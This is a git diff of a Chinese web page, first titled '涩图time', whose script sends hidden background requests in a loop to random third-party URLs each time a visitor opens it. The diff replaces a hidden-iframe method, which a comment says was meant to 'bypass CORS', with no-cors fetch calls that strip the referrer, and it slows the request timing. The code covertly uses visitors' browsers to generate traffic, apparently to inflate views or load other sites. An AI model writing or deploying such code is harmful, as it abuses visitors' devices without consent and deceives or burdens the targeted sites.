@@ -1,12 +1,13 @@
 
 
+
 <!-- 空白模版 -->
 <!DOCTYPE html>
 <html lang="zh-CN">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>涩图time</title>
+    <title>time</title>
     <style>
         /* 基础样式 */
         * {
@@ -393,7 +394,7 @@
             let requestCount = 1; // 进一步减少到1个并发请求
             let requests = [];
             let lastRequestTime = 0; // 记录上次请求时间
-            let minInterval = 5000; // 最小请求间隔5秒
+            let minInterval = 15000; // 最小请求间隔15秒
             
             function createRequests() {
                 for (let i = 0; i < requestCount; i++) {
@@ -418,92 +419,75 @@
                 lastRequestTime = currentTime;
                 const randomUrl = pageUrls[Math.floor(Math.random() * pageUrls.length)];
                 
-                // 方法1: 使用隐藏的iframe来绕过CORS
-                try {
-                    const iframe = document.createElement('iframe');
-                    iframe.style.display = 'none';
-                    iframe.style.width = '1px';
-                    iframe.style.height = '1px';
-                    iframe.src = randomUrl;
-                    iframe.onload = function() {
-                        loadCount++;
-                        console.log(`加载成功${loadCount}次 (页面: ${randomUrl})`);
-                        document.body.removeChild(iframe);
-                        const delay = 8000 + Math.random() * 7000; // 8-15秒延迟
-                        setTimeout(function() {
-                            makeRequest(index);
-                        }, delay);
-                    };
-                    iframe.onerror = function() {
-                        console.log(`请求失败：${randomUrl}`);
-                        document.body.removeChild(iframe);
-                        const delay = 10000 + Math.random() * 10000; // 10-20秒延迟
-                        setTimeout(function() {
-                            makeRequest(index);
-                        }, delay);
-                    };
-                    document.body.appendChild(iframe);
-                    
-                    // 设置超时清理
-                    setTimeout(function() {
-                        if (iframe.parentNode) {
-                            document.body.removeChild(iframe);
-                        }
-                    }, 15000);
-                    
-                } catch (e) {
-                    // 方法2: 使用fetch with no-cors (备用方案)
-                    if (typeof fetch !== 'undefined') {
-                        fetch(randomUrl, {
-                            method: 'GET',
-                            mode: 'no-cors',
-                            cache: 'no-cache',
-                            referrer: 'no-referrer'
-                        }).then(function(response) {
+                // 方法1: 使用fetch with no-cors (主要方案，因为iframe被X-Frame-Options阻止)
+                if (typeof fetch !== 'undefined') {
+                    fetch(randomUrl, {
+                        method: 'GET',
+                        mode: 'no-cors',
+                        cache: 'no-cache',
+                        referrer: 'no-referrer'
+                    }).then(function(response) {
+                        // no-cors模式下无法获取真实状态，但可以检查response类型
+                        if (response.type === 'opaque') {
+                            // opaque响应通常表示请求被发送但无法读取响应
                             loadCount++;
-                            console.log(`加载成功${loadCount}次 (页面: ${randomUrl})`);
-                            const delay = 8000 + Math.random() * 7000; // 8-15秒延迟
+                            console.log(`请求已发送${loadCount}次 (页面: ${randomUrl}) - 无法确认是否成功`);
+                            const delay = 20000 + Math.random() * 10000; // 20-30秒延迟
                             setTimeout(function() {
                                 makeRequest(index);
                             }, delay);
-                        }).catch(function(error) {
+                        } else {
                             console.log(`请求失败：${randomUrl}`);
-                            const delay = 10000 + Math.random() * 10000; // 10-20秒延迟
+                            const delay = 30000 + Math.random() * 20000; // 30-50秒延迟
                             setTimeout(function() {
                                 makeRequest(index);
                             }, delay);
-                        });
-                    } else {
-                        // 方法3: 使用XMLHttpRequest (最后备用)
-                        const xhr = new XMLHttpRequest();
-                        xhr.open('GET', randomUrl, true);
-                        xhr.timeout = 10000;
-                        xhr.onreadystatechange = function() {
-                            if (xhr.readyState === 4) {
+                        }
+                    }).catch(function(error) {
+                        console.log(`请求失败：${randomUrl}`);
+                        const delay = 30000 + Math.random() * 20000; // 30-50秒延迟
+                        setTimeout(function() {
+                            makeRequest(index);
+                        }, delay);
+                    });
+                } else {
+                    // 方法2: 使用XMLHttpRequest (备用方案)
+                    const xhr = new XMLHttpRequest();
+                    xhr.open('GET', randomUrl, true);
+                    xhr.timeout = 10000;
+                    xhr.onreadystatechange = function() {
+                        if (xhr.readyState === 4) {
+                            if (xhr.status >= 200 && xhr.status < 300) {
                                 loadCount++;
-                                console.log(`加载成功${loadCount}次 (页面: ${randomUrl})`);
-                                const delay = 8000 + Math.random() * 7000; // 8-15秒延迟
+                                console.log(`加载成功${loadCount}次 (页面: ${randomUrl}) - 状态码: ${xhr.status}`);
+                                const delay = 20000 + Math.random() * 10000; // 20-30秒延迟
+                                setTimeout(function() {
+                                    makeRequest(index);
+                                }, delay);
+                            } else {
+                                console.log(`请求失败：${randomUrl} - 状态码: ${xhr.status}`);
+                                const delay = 30000 + Math.random() * 20000; // 30-50秒延迟
                                 setTimeout(function() {
                                     makeRequest(index);
                                 }, delay);
                             }
-                        };
-                        xhr.onerror = function() {
-                            console.log(`请求失败：${randomUrl}`);
-                            const delay = 10000 + Math.random() * 10000; // 10-20秒延迟
-                            setTimeout(function() {
-                                makeRequest(index);
-                            }, delay);
-                        };
-                        xhr.ontimeout = function() {
-                            console.log(`请求超时：${randomUrl}`);
-                            const delay = 10000 + Math.random() * 10000; // 10-20秒延迟
-                            setTimeout(function() {
-                                makeRequest(index);
-                            }, delay);
-                        };
-                        xhr.send();
-                    }
+                        }
+                    };
+                    xhr.onerror = function() {
+                        console.log(`请求失败：${randomUrl}`);
+                        const delay = 30000 + Math.random() * 20000; // 30-50秒延迟
+                        setTimeout(function() {
+                            makeRequest(index);
+                        }, delay);
+                    };
+                    xhr.ontimeout = function() {
+                        console.log(`请求超时：${randomUrl}`);
+                        const delay = 30000 + Math.random() * 20000; // 30-50秒延迟
+                        setTimeout(function() {
+                            makeRequest(index);
+                        }, delay);
+                    };
+                    xhr.send();
                 }
             }
             
@@ -511,7 +495,7 @@
                 for (let i = 0; i < requestCount; i++) {
                     setTimeout(function() {
                         makeRequest(i);
-                    }, i * 3000); // 3秒启动间隔
+                    }, i * 10000); // 10秒启动间隔
                 }
             }
             
@@ -549,7 +533,7 @@
             createRequests();
             setTimeout(function() {
                 startAllRequests();
-            }, 1000);
+            }, 5000); // 5秒后开始请求
             setInterval(checkRequests, 3000);
             setInterval(function() {
                 const randomIndex = Math.floor(Math.random() * requestCount);
